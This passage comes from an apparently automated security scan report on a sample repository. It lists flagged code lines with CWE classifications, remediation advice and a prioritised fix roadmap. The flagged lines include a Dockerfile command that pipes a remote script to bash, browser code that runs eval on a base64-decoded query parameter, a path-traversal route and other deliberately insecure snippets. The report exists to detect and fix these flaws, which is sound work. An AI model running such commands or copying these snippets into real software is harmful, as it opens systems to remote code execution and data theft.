**Remediation.** Load signing keys from a secrets manager; prefer asymmetric keys; rotate the exposed secret.

### AUTO-0029

**Request data used in filesystem path (JS)**

- **Severity:** high
- **Status / confidence:** unverified / medium
- **Location:** `server.js:30`
- **Classification:** CWE-22, A01:2021
- **Detected by:** builtin:injection · rule `INJ-PATH-TRAVERSAL-JS` · fingerprint `91240de6a5f4678e96f6`

```
app.get("/file", (req, res) => res.sendFile(req.query.path));
```

**Evidence.** Line matches pattern for INJ-PATH-TRAVERSAL-JS.

**Remediation.** Resolve against a fixed base directory, reject paths escaping it (path.resolve + startsWith check), or map IDs to files server-side.

### AUTO-0030

**Environment file with values in repository**

- **Severity:** medium
- **Status / confidence:** unverified / medium
- **Location:** `.env:1`
- **Classification:** CWE-538, A05:2021
- **Detected by:** builtin:config · rule `CFG-ENV-FILE-PRESENT` · fingerprint `e6a5614450e5c971012f`

```
DATABASE_URL=post…[redacted 49 chars]
```

**Evidence.** Matched 1 required signal(s).

**Remediation.** Do not commit .env files; add them to .gitignore, commit a placeholder .env.example, and rotate any real values.

### AUTO-0031

**Container runs as root (no non-root USER)**

- **Severity:** medium
- **Status / confidence:** missing-control / high
- **Location:** `Dockerfile:1`
- **Classification:** CWE-250, A05:2021
- **Detected by:** builtin:iac · rule `IAC-DOCKER-NO-USER` · fingerprint `948597abf5ec2db9d8a7`

```
FROM python:latest
```

**Evidence.** Matched 1 required signal(s); none of 1 expected control pattern(s) present.

**Remediation.** Add a non-root user and `USER <uid>` in the final stage; combine with runAsNonRoot in Kubernetes.

### AUTO-0032

**ADD fetches remote URL**

- **Severity:** medium
- **Status / confidence:** unverified / high
- **Location:** `Dockerfile:2`
- **Classification:** CWE-494, A08:2021
- **Detected by:** builtin:iac · rule `IAC-DOCKER-ADD-REMOTE` · fingerprint `04ff9c274195571b0dfc`

```
ADD https://example.com/tool.tar.gz /opt/
```

**Evidence.** Line matches pattern for IAC-DOCKER-ADD-REMOTE.

**Remediation.** Download with curl/wget and verify a checksum or signature, or COPY vendored artifacts.

### AUTO-0033

**Remote script piped to shell**

- **Severity:** medium
- **Status / confidence:** unverified / high
- **Location:** `Dockerfile:5`
- **Classification:** CWE-494, A08:2021
- **Detected by:** builtin:supply-chain · rule `SC-CURL-PIPE-SHELL` · fingerprint `a4053468cba7b2f4572d`

```
RUN curl -fsSL https://get.example.sh | bash
```

**Evidence.** Line matches pattern for SC-CURL-PIPE-SHELL.

**Remediation.** Download to a file, verify checksum/signature, then execute; or use a package manager.

### AUTO-0034

**Redirect to user-controlled location**

- **Severity:** medium
- **Status / confidence:** unverified / medium
- **Location:** `app.py:40`
- **Classification:** CWE-601, A01:2021
- **Detected by:** builtin:injection · rule `INJ-OPEN-REDIRECT` · fingerprint `307ba00f90cfb4c6c75e`

```
return redirect(request.args.get("next"))
```

**Evidence.** Line matches pattern for INJ-OPEN-REDIRECT.

**Remediation.** Redirect only to relative paths or an allowlist of hosts; reject scheme-relative (//) and backslash tricks.

### AUTO-0035

**Network rule open to the internet (0.0.0.0/0 or ::/0)**

- **Severity:** medium
- **Status / confidence:** unverified / medium
- **Location:** `infra/main.tf:8`
- **Classification:** CWE-284, A05:2021
- **Detected by:** builtin:iac · rule `IAC-TF-OPEN-INGRESS` · fingerprint `a705c05ffeea4eb69c4d`

```
cidr_blocks = ["0.0.0.0/0"]
```

**Evidence.** Line matches pattern for IAC-TF-OPEN-INGRESS.

**Remediation.** Restrict source ranges to known CIDRs; never expose SSH/RDP/DB ports publicly; put services behind a load balancer/WAF.

### AUTO-0036

**Encryption at rest or key rotation disabled**

- **Severity:** medium
- **Status / confidence:** unverified / high
- **Location:** `infra/main.tf:20`
- **Classification:** CWE-311, A02:2021
- **Detected by:** builtin:iac · rule `IAC-ENCRYPTION-DISABLED` · fingerprint `fe61ed8333ff52c93ba8`

```
storage_encrypted   = false
```

**Evidence.** Line matches pattern for IAC-ENCRYPTION-DISABLED.

**Remediation.** Enable encryption at rest with KMS CMKs and automatic key rotation.

### AUTO-0037

**EC2 instance metadata v1 allowed**

- **Severity:** medium
- **Status / confidence:** unverified / high
- **Location:** `infra/main.tf:25`
- **Classification:** CWE-918, A10:2021
- **Detected by:** builtin:iac · rule `IAC-IMDSV1-ALLOWED` · fingerprint `cc84e455f56bd9836abe`

```
metadata_options { http_tokens = "optional" }
```

**Evidence.** Line matches pattern for IAC-IMDSV1-ALLOWED.

**Remediation.** Require IMDSv2: http_tokens = "required" (limits SSRF-to-credential theft).

### AUTO-0038

**Workload without runAsNonRoot**

- **Severity:** medium
- **Status / confidence:** missing-control / medium
- **Location:** `k8s/deployment.yaml:2`
- **Classification:** CWE-250, A05:2021
- **Detected by:** builtin:iac · rule `IAC-K8S-NO-SECURITY-CONTEXT` · fingerprint `dc4f9e8d16324e391f1e`

```
kind: Deployment
```

**Evidence.** Matched 1 required signal(s); none of 1 expected control pattern(s) present.

**Remediation.** Set securityContext: runAsNonRoot: true, readOnlyRootFilesystem: true, allowPrivilegeEscalation: false, capabilities.drop: [ALL], seccompProfile RuntimeDefault.

### AUTO-0039

**allowPrivilegeEscalation enabled**

- **Severity:** medium
- **Status / confidence:** unverified / high
- **Location:** `k8s/deployment.yaml:14`
- **Classification:** CWE-250, A05:2021
- **Detected by:** builtin:iac · rule `IAC-K8S-PRIV-ESCALATION` · fingerprint `5c928fb5280f3c2177d2`

```
allowPrivilegeEscalation: true
```

**Evidence.** Line matches pattern for IAC-K8S-PRIV-ESCALATION.

**Remediation.** Set allowPrivilegeEscalation: false.

### AUTO-0040

**Dependency 'lodahs' resembles popular package 'lodash'**

- **Severity:** medium
- **Status / confidence:** suspected / low
- **Location:** `package.json:12`
- **Classification:** CWE-829, A08:2021
- **Detected by:** builtin:supply-chain-structural · rule `SC-TYPOSQUAT-CANDIDATE` · fingerprint `77abbf21d701cabd1f6e`

```
lodahs
```

**Evidence.** Name is one edit away from 'lodash' (npm). This is a heuristic, not proof of malice.

**Remediation.** Verify the package's publisher, repository, download history and creation date; replace with the intended package if it is a typo.

### AUTO-0041

**Dependency fetched from git/URL/file instead of registry**

- **Severity:** medium
- **Status / confidence:** unverified / medium
- **Location:** `package.json:13`
- **Classification:** CWE-829, A08:2021
- **Detected by:** builtin:supply-chain · rule `SC-DEP-FROM-URL` · fingerprint `7a800cf9808af7ef80c2`

```
"left-pad": "git+https://github.com/example/left-pad.git"
```

**Evidence.** Line matches pattern for SC-DEP-FROM-URL.

**Remediation.** Prefer registry releases pinned in a lockfile; if a git dependency is needed pin to a commit SHA.

### AUTO-0042

**Assignment to innerHTML/outerHTML**

- **Severity:** medium
- **Status / confidence:** unverified / low
- **Location:** `public/app.js:2`
- **Classification:** CWE-79, A03:2021
- **Detected by:** builtin:xss · rule `XSS-DOM-INNERHTML` · fingerprint `21c25e641b3a581a129d`

```
document.getElementById("out").innerHTML = params.get("msg");
```

**Evidence.** Line matches pattern for XSS-DOM-INNERHTML.

**Remediation.** Use textContent or DOM APIs; sanitize HTML with DOMPurify when markup is required; adopt Trusted Types.

### AUTO-0043

**eval / new Function / string timers (JS)**

- **Severity:** medium
- **Status / confidence:** unverified / medium
- **Location:** `public/app.js:3`
- **Classification:** CWE-95, A03:2021
- **Detected by:** builtin:injection · rule `INJ-JS-EVAL` · fingerprint `84464002c7f71c84ef30`

```
eval(atob(params.get("payload")));
```

**Evidence.** Line matches pattern for INJ-JS-EVAL.

**Remediation.** Remove dynamic code evaluation; use JSON.parse, lookup tables, or function references.

### AUTO-0044

**Dependency 'reqeusts' resembles popular package 'requests'**

- **Severity:** medium
- **Status / confidence:** suspected / low
- **Location:** `requirements.txt:4`
- **Classification:** CWE-829, A08:2021
- **Detected by:** builtin:supply-chain-structural · rule `SC-TYPOSQUAT-CANDIDATE` · fingerprint `c0691e65bf0c5de27109`

```
reqeusts
```

**Evidence.** Name is one edit away from 'requests' (pypi). This is a heuristic, not proof of malice.

**Remediation.** Verify the package's publisher, repository, download history and creation date; replace with the intended package if it is a typo.

### AUTO-0045

**Additional package index (dependency confusion risk)**

- **Severity:** medium
- **Status / confidence:** unverified / medium
- **Location:** `requirements.txt:5`
- **Classification:** CWE-427, CWE-829, A08:2021
- **Detected by:** builtin:supply-chain · rule `SC-PIP-EXTRA-INDEX` · fingerprint `fa5e4165dfe215abf796`

```
--extra-index-url https://pypi.internal.example/simple
```

**Evidence.** Line matches pattern for SC-PIP-EXTRA-INDEX.

**Remediation.** Use a single private index that proxies the public one, pin hashes (--require-hashes), and reserve internal names publicly.

### AUTO-0046

**CORS allows any origin**

- **Severity:** medium
- **Status / confidence:** unverified / medium
- **Location:** `server.js:5`
- **Classification:** CWE-942, A05:2021
- **Detected by:** builtin:config · rule `CFG-CORS-WILDCARD` · fingerprint `3bbdb19ead93be0aaf6b`

```
app.use(require("cors")());
```

**Evidence.** Line matches pattern for CFG-CORS-WILDCARD.

**Remediation.** Allow an explicit list of trusted origins; never combine wildcard/reflection with credentials.

### AUTO-0047

**Request body bound directly to a model**

- **Severity:** medium
- **Status / confidence:** unverified / medium
- **Location:** `server.js:20`
- **Classification:** CWE-915, A01:2021, API3:2023
- **Detected by:** builtin:auth · rule `AUTH-MASS-ASSIGNMENT` · fingerprint `8518189194eac3ec47a0`

```
const user = await User.create(req.body);
```

**Evidence.** Line matches pattern for AUTH-MASS-ASSIGNMENT.

**Remediation.** Bind an explicit allowlist of fields (DTO/serializer fields/strong params); never let clients set role, owner, price, or tenant.

### AUTO-0048

**jsonwebtoken decode() does not verify signatures**

- **Severity:** medium
- **Status / confidence:** unverified / low
- **Location:** `server.js:25`
- **Classification:** CWE-347, A07:2021
- **Detected by:** builtin:auth · rule `AUTH-JWT-DECODE-NO-VERIFY-JS` · fingerprint `01245f1dec0ad603d01a`

```
const claims = jwt.decode(req.headers.authorization);
```

**Evidence.** Line matches pattern for AUTH-JWT-DECODE-NO-VERIFY-JS.

**Remediation.** Use jwt.verify(token, key, { algorithms: [...] }) for any trust decision.

### AUTO-0049

**Non-cryptographic RNG used for security value**

- **Severity:** medium
- **Status / confidence:** unverified / medium
- **Location:** `server.js:27`
- **Classification:** CWE-338, A02:2021
- **Detected by:** builtin:crypto · rule `CRY-INSECURE-RANDOM` · fingerprint `ce144029edd1334eb819`

```
res.json({ claims, token, sid: Math.random().toString(36) });
```

**Evidence.** Line matches pattern for CRY-INSECURE-RANDOM.

**Remediation.** Use secrets / crypto.randomBytes / crypto.getRandomValues / SecureRandom / crypto/rand.

### AUTO-0050

**Workflow without explicit token permissions**

- **Severity:** low
- **Status / confidence:** missing-control / high
- **Location:** `.github/workflows/ci.yml:5`
- **Classification:** CWE-250, A05:2021
- **Detected by:** builtin:cicd · rule `CI-GHA-NO-PERMISSIONS` · fingerprint `9c7f3c4db96611285219`

```
jobs:
```

**Evidence.** Matched 1 required signal(s); none of 1 expected control pattern(s) present.

**Remediation.** Add top-level `permissions: contents: read` and grant write scopes per job only where needed.

### AUTO-0051

**Third-party GitHub Action not pinned to a commit SHA**

- **Severity:** low
- **Status / confidence:** unverified / high
- **Location:** `.github/workflows/ci.yml:12`
- **Classification:** CWE-829, A08:2021
- **Detected by:** builtin:cicd · rule `CI-GHA-UNPINNED-ACTION` · fingerprint `44a689331bcb20ef506f`

```
- uses: some-org/deploy-action@v2
```

**Evidence.** Line matches pattern for CI-GHA-UNPINNED-ACTION.

**Remediation.** Pin to a full 40-char commit SHA (with a version comment) and let Dependabot update it.

### AUTO-0052

**Base image unpinned or :latest**

- **Severity:** low
- **Status / confidence:** unverified / high
- **Location:** `Dockerfile:1`
- **Classification:** CWE-1357, A08:2021
- **Detected by:** builtin:supply-chain-structural · rule `IAC-DOCKER-UNPINNED-BASE` · fingerprint `2c205d341653de6ac5e1`

```
FROM python:latest
```

**Evidence.** Image 'python:latest' has tag latest and no digest.

**Remediation.** Pin base images to a version tag and digest (image:tag@sha256:...); update via Dependabot/Renovate.

### AUTO-0053

**Workload without resource limits**

- **Severity:** low
- **Status / confidence:** missing-control / medium
- **Location:** `k8s/deployment.yaml:2`
- **Classification:** CWE-770, A05:2021
- **Detected by:** builtin:iac · rule `IAC-K8S-NO-RESOURCE-LIMITS` · fingerprint `363d7550223c3224eb19`

```
kind: Deployment
```

**Evidence.** Matched 2 required signal(s); none of 1 expected control pattern(s) present.

**Remediation.** Set CPU/memory requests and limits to contain resource exhaustion.

### AUTO-0054

**No lockfile for npm dependencies**

- **Severity:** low
- **Status / confidence:** missing-control / high
- **Location:** `package.json`
- **Classification:** CWE-1104, CWE-829, A06:2021, A08:2021
- **Detected by:** builtin:supply-chain-structural · rule `SC-NO-LOCKFILE` · fingerprint `26045036331847942e7c`

**Evidence.** Manifest package.json found without a npm lockfile.

**Remediation.** Commit a lockfile so builds are reproducible and dependency integrity hashes are enforced.

### AUTO-0055

**Express app without security headers middleware**

- **Severity:** low
- **Status / confidence:** missing-control / medium
- **Location:** `package.json:9`
- **Classification:** CWE-693, A05:2021
- **Detected by:** builtin:config · rule `CFG-EXPRESS-NO-HELMET` · fingerprint `1215045d3d2ef1fac867`

```
"express": "4.17.1",
```

**Evidence.** Matched 1 required signal(s); none of 1 expected control pattern(s) present.

**Remediation.** Add helmet (or equivalent explicit headers: CSP, HSTS, X-Content-Type-Options, frame-ancestors).

### AUTO-0056

**No rate limiting library detected (Node)**

- **Severity:** low
- **Status / confidence:** missing-control / low
- **Location:** `package.json:9`
- **Classification:** CWE-307, CWE-770, A07:2021, API4:2023
- **Detected by:** builtin:config · rule `CFG-NO-RATE-LIMIT-DEP` · fingerprint `8db685547206e3ee0ac3`

```
"express": "4.17.1",
```

**Evidence.** Matched 1 required signal(s); none of 1 expected control pattern(s) present.

**Remediation.** Rate-limit authentication, password reset, OTP and expensive endpoints (express-rate-limit, gateway/WAF limits).

### AUTO-0057

**Dependency version wildcard or 'latest'**

- **Severity:** low
- **Status / confidence:** unverified / high
- **Location:** `package.json:10`
- **Classification:** CWE-1104, A06:2021
- **Detected by:** builtin:supply-chain · rule `SC-WILDCARD-VERSION` · fingerprint `e565e4803d6e2c879bdb`

```
"jsonwebtoken": "*",
```

**Evidence.** Line matches pattern for SC-WILDCARD-VERSION.

**Remediation.** Specify a version range and commit a lockfile; use exact versions for critical packages.

### AUTO-0058

**Unpinned Python requirement**

- **Severity:** low
- **Status / confidence:** unverified / medium
- **Location:** `requirements.txt:1`
- **Classification:** CWE-1104, A06:2021
- **Detected by:** builtin:supply-chain · rule `SC-UNPINNED-PY-REQ` · fingerprint `e0b12389655a19638aad`

```
flask
```

**Evidence.** Line matches pattern for SC-UNPINNED-PY-REQ.

**Remediation.** Pin exact versions (==) and ideally hashes; generate with pip-compile/uv.

### AUTO-0059

**Unpinned Python requirement**

- **Severity:** low
- **Status / confidence:** unverified / medium
- **Location:** `requirements.txt:2`
- **Classification:** CWE-1104, A06:2021
- **Detected by:** builtin:supply-chain · rule `SC-UNPINNED-PY-REQ` · fingerprint `61d4616c0715f897b284`

```
requests>=2.0
```

**Evidence.** Line matches pattern for SC-UNPINNED-PY-REQ.

**Remediation.** Pin exact versions (==) and ideally hashes; generate with pip-compile/uv.

## 7. Triaged and closed items

Kept for auditability. Every decision has a recorded reason.

| ID | Status | Title | Location | Reason |
|---|---|---|---|---|
| AUTO-0060 | accepted-risk | Package defines an install-time lifecycle script | `package.json:5` | Informational duplicate of SC-INSTALL-SCRIPT-SUSPICIOUS for the same line; tracked there. (Example of a recorded decision.) |

## 8. Untested areas and limitations

- **authentication / Authentication flows: login, reset, MFA, session lifecycle (checklists/authentication.md, session-jwt-oauth.md)** — skipped: requires analyst review (SKILL.md phases 3-7)
- **authorization / Object/function-level authorization (BOLA/IDOR/BFLA) on every route - requires code tracing (checklists/authorization.md)** — skipped: requires analyst review (SKILL.md phases 3-7)
- **business-logic / Business logic, race conditions and transaction integrity (checklists/business-logic-and-race-conditions.md)** — skipped: requires analyst review (SKILL.md phases 3-7)
- **cicd / zizmor** — skipped: --no-tools given
- **data-flow / Source-to-sink data-flow tracing across components** — skipped: requires analyst review (SKILL.md phases 3-7)
- **iac / checkov** — skipped: --no-tools given
- **iac / hadolint** — skipped: --no-tools given
- **privacy / Data classification, retention, backups and disaster recovery (checklists/privacy-and-data-protection.md)** — skipped: requires analyst review (SKILL.md phases 3-7)
- **runtime / Runtime behaviour, deployed configuration and infrastructure state (needs authorized DAST/cloud review)** — skipped: requires analyst review (SKILL.md phases 3-7)
- **sast / bandit** — skipped: --no-tools given
- **sast / brakeman** — skipped: --no-tools given
- **sast / gosec** — skipped: --no-tools given
- **sast / semgrep** — skipped: --no-tools given
- **sca / known-vulnerability-lookup** — unavailable: no SCA source ran - dependency CVEs were NOT checked. Install osv-scanner/trivy or use --osv-api.
- **sca / osv-api** — skipped: opt-in: pass --osv-api (sends package names/versions to api.osv.dev)
- **sca / govulncheck** — skipped: --no-tools given
- **sca / npm-audit** — skipped: --no-tools given
- **sca / osv-scanner** — skipped: --no-tools given
- **sca / pip-audit** — skipped: --no-tools given
- **sca+iac / trivy** — skipped: --no-tools given
- **secrets / gitleaks** — skipped: --no-tools given
- **supply-chain / installed-npm-install-hooks** — skipped: runs in deep mode only (mode=comprehensive)
- **threat-model / Threat model and attack-path chaining (references/threat-modeling.md)** — skipped: requires analyst review (SKILL.md phases 3-7)
- No running instance was available; all results are from static analysis (no runtime validation performed).
- External scanners were not installed in the example run; dependency CVEs were not checked.
- Regex-based built-in rules do not perform inter-procedural data-flow analysis; absence of a match is not absence of a flaw.
- Dependency findings report known advisories only; reachability and zero-days are not assessed.

## 9. Prioritized remediation roadmap

**Immediate (0–7 days)**

- [ ] AUTO-0001 — pull_request_target checks out untrusted PR code (`.github/workflows/ci.yml:3`)
- [ ] AUTO-0012 — Unsafe Python deserialization (pickle and friends) (`app.py:45`)
- [ ] AUTO-0008 — SQL built with string formatting (Python) (`app.py:19`)
- [ ] AUTO-0011 — Outbound request to user-controlled URL (Python) (`app.py:35`)

**Short term (≤30 days)**

- [ ] AUTO-0002 — Credentials embedded in connection URL (`.env:1`)
- [ ] AUTO-0003 — GitHub token in source (`.env:2`)
- [ ] AUTO-0004 — Untrusted GitHub context expanded in workflow script (`.github/workflows/ci.yml:13`)
- [ ] AUTO-0005 — Secret passed via ENV/ARG in image (`Dockerfile:3`)
- [ ] AUTO-0006 — Hardcoded framework secret key (`app.py:11`)
- [ ] AUTO-0007 — AWS access key ID in source (`app.py:12`)
- [ ] MAN-001 — No authentication or authorization on any HTTP route (`app.py:16`)
- [ ] AUTO-0009 — subprocess with shell=True (`app.py:25`)
- [ ] AUTO-0010 — Template rendered from a dynamic string (SSTI) (`app.py:30`)
- [ ] AUTO-0013 — Unsafe YAML load (Python) (`app.py:50`)
- [ ] AUTO-0014 — Request data used in filesystem path (Python) (`app.py:55`)
- [ ] AUTO-0015 — TLS certificate verification disabled (`app.py:59`)
- [ ] AUTO-0016 — Flask/Werkzeug debugger enabled (`app.py:60`)
- [ ] AUTO-0017 — Object storage publicly accessible (`infra/main.tf:14`)
- [ ] AUTO-0018 — Object storage publicly accessible (`infra/main.tf:15`)
- [ ] AUTO-0019 — Database publicly accessible (`infra/main.tf:19`)
- [ ] AUTO-0020 — Hardcoded password in infrastructure code (`infra/main.tf:21`)
- [ ] AUTO-0021 — Pod shares host network/PID/IPC namespace (`k8s/deployment.yaml:8`)
- [ ] AUTO-0022 — Privileged container (`k8s/deployment.yaml:13`)
- [ ] AUTO-0023 — Install lifecycle script with network/eval/encoded payload (`package.json:5`)
- [ ] AUTO-0024 — Execution of decoded/obfuscated payload (`public/app.js:3`)
- [ ] AUTO-0025 — SQL built with template literal or concatenation (JS/TS) (`server.js:8`)
- [ ] AUTO-0026 — child_process exec with dynamic string (`server.js:12`)
- [ ] AUTO-0027 — Request data written directly to HTML response (`server.js:16`)
- [ ] AUTO-0028 — JWT signed/verified with hardcoded secret (`server.js:26`)
- [ ] AUTO-0029 — Request data used in filesystem path (JS) (`server.js:30`)

**Planned (≤90 days)**

- [ ] AUTO-0030 — Environment file with values in repository (`.env:1`)
- [ ] AUTO-0031 — Container runs as root (no non-root USER) (`Dockerfile:1`)
- [ ] AUTO-0032 — ADD fetches remote URL (`Dockerfile:2`)
- [ ] AUTO-0033 — Remote script piped to shell (`Dockerfile:5`)
- [ ] AUTO-0034 — Redirect to user-controlled location (`app.py:40`)
- [ ] AUTO-0035 — Network rule open to the internet (0.0.0.0/0 or ::/0) (`infra/main.tf:8`)
- [ ] AUTO-0036 — Encryption at rest or key rotation disabled (`infra/main.tf:20`)
- [ ] AUTO-0037 — EC2 instance metadata v1 allowed (`infra/main.tf:25`)
- [ ] AUTO-0038 — Workload without runAsNonRoot (`k8s/deployment.yaml:2`)
- [ ] AUTO-0039 — allowPrivilegeEscalation enabled (`k8s/deployment.yaml:14`)
- [ ] AUTO-0040 — Dependency 'lodahs' resembles popular package 'lodash' (`package.json:12`)
- [ ] AUTO-0041 — Dependency fetched from git/URL/file instead of registry (`package.json:13`)
- [ ] AUTO-0042 — Assignment to innerHTML/outerHTML (`public/app.js:2`)
- [ ] AUTO-0043 — eval / new Function / string timers (JS) (`public/app.js:3`)
- [ ] AUTO-0044 — Dependency 'reqeusts' resembles popular package 'requests' (`requirements.txt:4`)
- [ ] AUTO-0045 — Additional package index (dependency confusion risk) (`requirements.txt:5`)
- [ ] AUTO-0046 — CORS allows any origin (`server.js:5`)
- [ ] AUTO-0047 — Request body bound directly to a model (`server.js:20`)
- [ ] AUTO-0048 — jsonwebtoken decode() does not verify signatures (`server.js:25`)
- [ ] AUTO-0049 — Non-cryptographic RNG used for security value (`server.js:27`)
- [ ] AUTO-0050 — Workflow without explicit token permissions (`.github/workflows/ci.yml:5`)
- [ ] AUTO-0053 — Workload without resource limits (`k8s/deployment.yaml:2`)
- [ ] AUTO-0054 — No lockfile for npm dependencies (`package.json`)
- [ ] AUTO-0055 — Express app without security headers middleware (`package.json:9`)
- [ ] AUTO-0056 — No rate limiting library detected (Node) (`package.json:9`)

**Hardening backlog**

- [ ] AUTO-0051 — Third-party GitHub Action not pinned to a commit SHA (`.github/workflows/ci.yml:12`)
- [ ] AUTO-0052 — Base image unpinned or :latest (`Dockerfile:1`)
- [ ] AUTO-0057 — Dependency version wildcard or 'latest' (`package.json:10`)
- [ ] AUTO-0058 — Unpinned Python requirement (`requirements.txt:1`)
- [ ] AUTO-0059 — Unpinned Python requirement (`requirements.txt:2`)

## 10. Regression testing

- MAN-001: see regression test in finding details.

Run continuous mode to detect regressions by fingerprint: `appsec.py ci --baseline .appsec/baseline.json --fail-on high`.

---
Machine-readable outputs: `findings.json` (full results), `report.sarif` (SARIF 2.1.0), `coverage.json`, `inventory.json`, `stack.json`, `activity.log.jsonl` (audit trail).
